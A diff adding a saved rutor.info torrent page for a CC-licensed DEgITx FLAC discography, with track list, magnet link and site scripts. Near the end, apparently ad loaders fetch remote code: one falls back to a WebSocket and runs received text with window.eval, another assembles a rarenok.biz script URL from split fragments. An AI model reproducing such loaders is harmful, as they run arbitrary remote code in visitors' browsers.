@@ -1,0 +1,455 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: DEgITx - Дискография (2013-2018) FLAC</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>DEgITx - Дискография (2013-2018) FLAC</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:a58b7b47c87a32fb305d07f3dfaf4fd24923dabc&amp;dn=rutor.info_DEgITx+-+%D0%94%D0%B8%D1%81%D0%BA%D0%BE%D0%B3%D1%80%D0%B0%D1%84%D0%B8%D1%8F+%282013-2018%29+FLAC&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630510"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630510"><img src="http://s.rutor.info/t/down.png"> Скачать DEgITx_lossless.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i58.fastpic.ru/big/2014/0224/62/eec1c9dc98892d5a88b46ade2edc7662.jpg" /><br />
+<br />
+<b>Название: </b>Дискография [08.05.2018]<br />
+<b>Исполнитель: </b>DEgITx<br />
+<b>Год: </b>2013-2018<br />
+<b>Жанр: </b> Melodic Metal, Power Metal, Sid Metal, <a href="/tag/2/Electronic" target="_blank">Electronic</a>, <a href="/tag/2/Instrumental" target="_blank">Instrumental</a>, Melodic Death Metal<br />
+<b>Страна: </b>Беларусь<br />
+<br />
+<b>Продолжительность: </b>05:16:34<br />
+<b>Формат/Кодек: </b>FLAC<br />
+<b>Битрейт аудио: </b>~1700 kbps<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Трек-лист</div><div class="hidebody"></div><textarea class="hidearea"><br />
+2013 - Demo:<br />
+01. Your Sad Story (Intro)<br />
+02. Out From The Darkness<br />
+03. Soulbinder<br />
+04. Secret Crush (LilyPichu cover)<br />
+05. Someone Ate Cake<br />
+06. Ninja cats Revenge<br />
+07. Happa<br />
+08. Burning sadness<br />
+09. Winter Storm<br />
+10. Fairy<br />
+<br />
+2014 - Between Death and Stars:<br />
+01. Forgotten (Intro)<br />
+02. Game Not Over<br />
+03. Dead Space<br />
+04. Mounting a Nightmare<br />
+05. Reach the Galaxy<br />
+06. Tree Rock (feat. Tore Fagerheim)<br />
+07. Hard Drive<br />
+08. LifeBreak<br />
+09. Between Death And Stars<br />
+10. Rain Of That Day<br />
+11. Fairy (8Bit Remix)<br />
+<br />
+2016 - Forest Sprites:<br />
+01. Somewhere on Glade (Intro)<br />
+02. Road To Heaven (feat. Matty M.)<br />
+03. Stepfather<br />
+04. Moonlight and Sunrise<br />
+05. Forest Spirits<br />
+06. Remember Your Name (Vocals)<br />
+07. Far Away<br />
+08. Jinx<br />
+09. Minefield (feat. Matty M.)<br />
+10. Dark Energy feat. Neil (Extended)<br />
+11. The Name of the Wind<br />
+12. Forest House<br />
+13. Surf City (Battletoads Cover)<br />
+14. Winter Storm (Industrial Version)<br />
+15. Remember Your Name (Instrumental)<br />
+16. Dark Energy (Instrumental)<br />
+<br />
+2017 - Memories<br />
+01. Memories<br />
+02. Ropes n Roper<br />
+03. Rat Race<br />
+04. Missile Mayhem<br />
+05. Surf City<br />
+06. Memories (Full EP)<br />
+<br />
+2017 - Red Flower<br />
+01. City Under Sky (Intro)<br />
+02. Grim Reaper (feat. Matty M.)<br />
+03. Hand in Hand (Vocals)<br />
+04. Machine Paradigm<br />
+05. Catch my Dragon<br />
+06. Before The Storm<br />
+07. Ninja Soul<br />
+08. Warp<br />
+09. Christmas Song<br />
+10. Red Flower<br />
+11. Dancing With Wolves<br />
+12. Dreamfall<br />
+13. Hand in Hand (Instrumental)<br />
+14. Red Flower (Acoustic)<br />
+15. Stepfather (Vocals)<br />
+<br />
+2018 - Digital Hell<br />
+03. Pixel Rain<br />
+04. New Dawn<br />
+05. Forest House (Vocals)<br />
+06. Light End<br />
+07. Requiem for a Wind (Vocals)<br />
+<br />
+Covers<br />
+01. Cups (Anna Kendrick Cover)<br />
+02. Gravity Falls Theme<br />
+03. Flight (Tristam &amp; Braken Cover)<br />
+04. Zone J (Chip &amp; Dale Cover)<br />
+05. Open Your Eyes (Aviators Cover)<br />
+06. Jungle (Ranger X Cover)<br />
+07. The Curse of the Sad Mummy (LoL Cover)<br />
+08. Ninja Cats Again (Cover)<br />
+09. Driving My Tractor (Farm Animal Sounds Song Cover)<br />
+10. Shou no Kanashimi (Arrietty Cover)<br />
+11. Rat Race (Battletoads Cover)<br />
+12. Fire (TMNT2 Cover Stage 1)<br />
+13. Stage 3 (Battletoads &amp; Double Dragon Cover)<br />
+14. My Silver Lining (First Aid Kit Borderlands Metal Cover)<br />
+15. My Silver Lining (First Aid Kit Borderlands Metal Cover) [Sid Version]<br />
+16. Missile Mayhem (Battletoads &amp; Double Dragon Cover) [SNES Version]<br />
+17. Missile Mayhem (Battletoads &amp; Double Dragon Cover) [NES Version]<br />
+18. Saltkin (Purity Ring Metal Cover)<br />
+19. Candy Boy (TREN-D Metal Cover)<br />
+20. Forces (Berserk Metal Cover)<br />
+21. Arab Rock (Aladdin Metal Cover)<br />
+22. Night Before Christmas (Sector Gaza Metal Cover)<br />
+23. Sailor Girl (Oleg Gazmanov Metal Cover)<br />
+24. Underground River (Made in Abyss Metal Cover)<br />
+25. Jingle Bells Metal Cover (Demo)<br />
+26. Jabberwocky (Erutan Metal Cover)<br />
+<br />
+Unreleased<br />
+01. Epsilon<br />
+02. The Longest Journey<br />
+03. Optimistic (Instrumental)<br />
+04. Optimistic (Vocaloid)<br />
+05. Dramatic Fly<br />
+06. Sky Pony<br />
+07. Lelungan Kulo<br />
+08. Starfall (2014 Demo)<br />
+09. Open Heart<br />
+10. Nobody Will Escape<br />
+11. Pen In My Hand<br />
+<br />
+Песни добавляются в порядке выхода<br />
+</textarea></div><br />
+<br />
+<b>Дополнительная информация: </b>DEgITx (Also known as DEg) - belarusian composer and programmer that trying to make mix between chiptunes and rock/metal music.<br />
+<br />
+Вся музыка бесплатна и публично распространяемая под лицензией <b>CC BY 3.0</b> и свободна для использования в роликах, играх, любой другой творческой дейтельности без каких-либо коммерческих ограничений.</td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1063828/0" target="_blank">DEgITx</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/audio" target="_blank">Музыка</a></td></tr>
+<tr><td class="header">Раздают</td><td>6</td></tr>
+<tr><td class="header">Качают</td><td>3</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (19 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 23:03:40  (10 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>3.98&nbsp;GB  (4268387837 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630510);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630511"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:29ebe63feb8be91b6dcff02bacc562d9a99ea864&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630511/degitx-diskografija-2013-2018-mp3">DEgITx - Дискография (2013-2018) MP3 </a></td> 
+<td align="right">730.73&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;12</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;8</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/2/0/0/DEgITx" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630510.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (116)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630510">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630510);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630510);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630510">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
